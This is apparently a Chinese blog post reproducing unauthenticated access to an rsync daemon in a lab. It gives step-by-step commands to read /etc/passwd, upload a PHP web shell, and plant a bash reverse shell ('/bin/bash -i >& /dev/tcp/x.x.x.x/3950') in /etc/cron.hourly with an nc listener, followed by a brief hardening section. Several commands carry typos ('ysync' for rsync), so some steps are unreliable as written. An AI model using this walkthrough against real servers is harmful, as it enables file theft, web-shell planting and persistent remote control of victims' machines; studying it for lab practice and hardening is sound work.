---
title: Rsync未授权访问复现
date: 2020-05-30 15:42:36
categories: 漏洞复现
tags: 未授权访问
---

#### Rsync

rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听**873**端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件,甚至可以反弹shell。

<!--more-->

#### 未授权访问读取文件

读取文件

`rsync ysync://url:端口/目录`

![](http://cdn.laohuan.art/2020-05-29_16-40-45.png)

##### 下载文件

下载目标的passwd文件

`rsync rsync://url:80/src/etc/passwd ./`

![](http://cdn.laohuan.art/2020-05-29_16-45-44.png)

查看目标主机用户

![](http://cdn.laohuan.art/2020-05-29_16-47-07.png)

#### 上传shell

`ysync -av shell.php rsync://url:端口/src`

![](http://cdn.laohuan.art/2020-05-29_17-26-08.png)

可以看到shell已经传到目标主机上

![](http://cdn.laohuan.art/2020-05-29_15-23-36.png)

#### 反弹shell

##### crontab

Linux crontab是用来定期执行程序的命令。

当安装完成操作系统之后，默认便会启动此任务调度命令。

crond 命令每分锺会定期检查是否有要执行的工作，如果有要执行的工作便会自动执行该工作

下载并查看目标计划任务

`rsync ysync://url:端口/src/etc/crontab ./`

![](http://cdn.laohuan.art/2020-05-29_21-27-30.png)

红框内容表示每小时的第17分钟将会执行如下命令

`run-parts --report /etc/cron.hourly`

此文件下的东西，每个小时的第17分钟都将被执行一遍，我们将shell写到这个文件下，再另一个服务器设置好监听，稍加等待便能获得shell

上传反弹shell

准备我们的shell文件，shell内容如下

```bash
#!/bin/bash 
/bin/bash -i >& /dev/tcp/x.x.x.x/3950 0>&1
```

1. x.x.x.x为攻击机的IP地址
2. 3950为攻击机的监听端口

![](http://cdn.laohuan.art/2020-05-29_21-30-53.png)

上传shell

`rsync -av shell rsync://url:端口/src/etc/cron.hourly`

![](http://cdn.laohuan.art/2020-05-29_21-32-40.png)

在目标机的/etc/cron.hourly/下能看到上传的shell文件

![](http://cdn.laohuan.art/2020-05-29-41.png)

#### 反弹

在攻击设置好监听

`nc -nvlp 3950`

监听端口需和反弹shell里所一致

![](http://cdn.laohuan.art/2020-05-29_21-33-58.png)

实验里可根据具体时间修改靶机的/etc/crontab的文件，快速反弹shell，而实际环境就慢慢的等到每个小时的第17分钟吧

稍加等待，便能获得shell

![](http://cdn.laohuan.art/2020-05-29_15-18-02.png)

#### 防御

1.编辑配置文件

`nano /etc/rsync.conf`

2.写入代码

```
hosts allow xxx.xxx.xxx.xxx #限制访问IP
auth users = rsync           #认证的用户
secrets file = /etc/rsyncd.passwd
```

3.新增文件

`vim /etc/rsyncd.passwd`

写入用户密码

`ysync :password`

##### 参考链接

<https://blog.csdn.net/qq_36374896/article/details/84112341/>

<https://github.com/vulhub/vulhub/tree/master/rsync/common/>

